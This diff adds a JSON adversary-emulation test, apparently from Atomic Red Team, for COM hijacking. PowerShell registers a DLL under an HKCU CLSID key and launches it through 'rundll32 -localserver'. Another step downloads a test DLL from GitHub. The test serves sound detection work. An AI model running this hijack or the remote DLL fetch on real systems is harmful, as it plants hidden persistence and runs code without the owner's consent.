@@ -1,0 +1,123 @@
+{
+  "id": "123520cc-e998-471b-a920-bd28e3feafa0",
+  "name": "COM Hijacking with RunDLL32 (Local Server Switch)",
+  "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\". \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\nUpon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. ",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "c2e34fd3-8922-4cea-9428-68f1e2ad9352",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value \"#{dll_path}\"\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-localserver #{clsid}'",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "69dc84da-5e53-4cec-86f6-768646ac4638",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Recurse -ErrorAction Ignore",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "494f50aa-8918-4bb1-8cd0-037da0f1d04d",
+      "name": "Check dependency 1/1",
+      "description": "DLL For testing",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "7523ae83-23e0-4232-8f09-abda60c001f8",
+      "name": "Resolve dependency 1/1",
+      "description": "DLL For testing",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015_calc.dll\" -OutFile \"#{dll_path}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d34fdcac-ebdf-4e43-bf64-854b240a5bca",
+      "name": "Re-check dependency 1/1",
+      "description": "DLL For testing",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "c2e34fd3-8922-4cea-9428-68f1e2ad9352",
+      "p": "on-success",
+      "o": "69dc84da-5e53-4cec-86f6-768646ac4638"
+    },
+    {
+      "s": "c2e34fd3-8922-4cea-9428-68f1e2ad9352",
+      "p": "on-failure",
+      "o": "69dc84da-5e53-4cec-86f6-768646ac4638"
+    },
+    {
+      "s": "494f50aa-8918-4bb1-8cd0-037da0f1d04d",
+      "p": "on-success",
+      "o": "c2e34fd3-8922-4cea-9428-68f1e2ad9352"
+    },
+    {
+      "s": "494f50aa-8918-4bb1-8cd0-037da0f1d04d",
+      "p": "on-failure",
+      "o": "7523ae83-23e0-4232-8f09-abda60c001f8"
+    },
+    {
+      "s": "7523ae83-23e0-4232-8f09-abda60c001f8",
+      "p": "on-success",
+      "o": "d34fdcac-ebdf-4e43-bf64-854b240a5bca"
+    },
+    {
+      "s": "d34fdcac-ebdf-4e43-bf64-854b240a5bca",
+      "p": "on-failure",
+      "o": "c2e34fd3-8922-4cea-9428-68f1e2ad9352"
+    }
+  ],
+  "tags": [
+    "T1546.015",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "clsid_threading",
+      "type": "string",
+      "description": "Threading Model",
+      "value": "Both"
+    },
+    {
+      "name": "dll_path",
+      "type": "string",
+      "description": "Path to the DLL.",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1546.015_calc.dll"
+    },
+    {
+      "name": "clsid",
+      "type": "string",
+      "description": "Class ID to hijack.",
+      "value": "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
+    },
+    {
+      "name": "clsid_description",
+      "type": "string",
+      "description": "Description for CLSID",
+      "value": "MSAA AccPropServices"
+    }
+  ]
+}
